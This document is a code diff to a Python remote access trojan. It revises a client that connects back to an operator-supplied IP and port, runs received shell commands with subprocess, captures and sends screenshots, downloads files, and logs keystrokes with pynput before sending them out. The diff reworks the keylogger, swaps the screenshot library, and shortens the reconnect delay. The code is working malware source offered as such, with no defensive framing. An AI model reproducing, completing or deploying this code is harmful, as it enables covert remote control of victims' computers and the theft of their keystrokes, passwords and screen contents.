@@ -1,8 +1,13 @@
-import socket, time, subprocess, json, os, getpass, pyautogui, pynput, pynput.keyboard
-from threading import Thread
+import socket, time, subprocess, json, os, getpass, pynput
+from pynput import keyboard
+from PIL import ImageGrab
+
 def main() :
     def reliable_send(data):
+            print("reached send")
+            print(data)
             jsondata = json.dumps(data)
+            print(data)
             s.send(jsondata.encode())
 
     def reliable_recv():
@@ -13,51 +18,39 @@ def main() :
                             return json.loads(data)
                     except ValueError:
                             continue
-
-    def keyl() :
-        print("here")
-        keys = [""]
-        def on_press(key):
-        
-            try:
-            #print(key)
+   
+    
+    def keys(stop) :
+            
+            def on_press(key) :
                 
-            
-                keys.append(key.char)
-            
-            except AttributeError:
-                if key == keyboard.Key.backspace :
-                    keys.append("<backspace>")
-                if key == keyboard.Key.space :
-                    keys.append("<space>")
-                pass
-
-        def on_release(key):
-        #print('{0} released'.format(key))
-            if key == keyboard.Key.esc:
-        
-            # Stop listener
-                reliable_send(keys)
-                t1.terminate()
-                return False
-
+                record.append(key)
+                print(record)
                 
 
-    # Collect events until released
-        with keyboard.Listener(
-                on_press=on_press,
-                on_release=on_release) as listener:
-            listener.join()
-    def keyl_stop() :
-
-        k = Controller()
-        k.press(Key.esc)
-        k.release(Key.esc)
-        t2.terminate()
+            if stop == 0 :
+                print("stop = 0 assign new var and listener")
+                listener = keyboard.Listener(on_press=on_press)
+                listener.start()
+                global record
+                record = []
+                
+            if stop == 1 :
+                print("convert to string i think")
+                print(record)
+                stringrecord = ''.join(str(record))
+                stringrecord = stringrecord.strip("[]")
+                reliable_send(stringrecord)
+                listener.stop()
+                record = []
+            
+                
+                    
+        
 
     def screenshot() :
 
-        im = pyautogui.screenshot()
+        im = ImageGrab.grab()
         user = getpass.getuser()
         im.save(f"C:/Users/"+ str(user)+"/img.png")
         f = open("C:/Users/"+ str(user)+"/img.png", 'rb')
@@ -66,9 +59,9 @@ def main() :
         os.remove(f"C:/Users/"+ str(user)+"/img.png")
     def connection():
         while True:
-            time.sleep(20)
+            time.sleep(5)
             try:
-                s.connect(('192.168.1.2',5555))
+                s.connect((ENTER YOUR IP ADDRESS HERE, ENTER YOUR PORT HERE))
                 shell()
                 s.close()
                 break
@@ -97,8 +90,6 @@ def main() :
     def shell():
 
         while True:
-            t1 = Thread(target=keyl)
-            t2 = Thread(target=keyl_stop)
             command = reliable_recv()
             if command == 'quit':
                 break
@@ -112,11 +103,10 @@ def main() :
                 download_file(command[7:])
             elif command == 'screenshot':
                 screenshot()
-            elif command == 'keys' :
-                t1.start()
-                
-            elif command == 'keys_stop' :
-                t2.start()
+            elif command == 'keys':
+                keys(0)
+            elif command == 'keys_stop':
+                keys(1)
             else:
                 execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                 result = execute.stdout.read() + execute.stderr.read()
@@ -126,3 +116,5 @@ def main() :
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     connection()
 main()
+
+
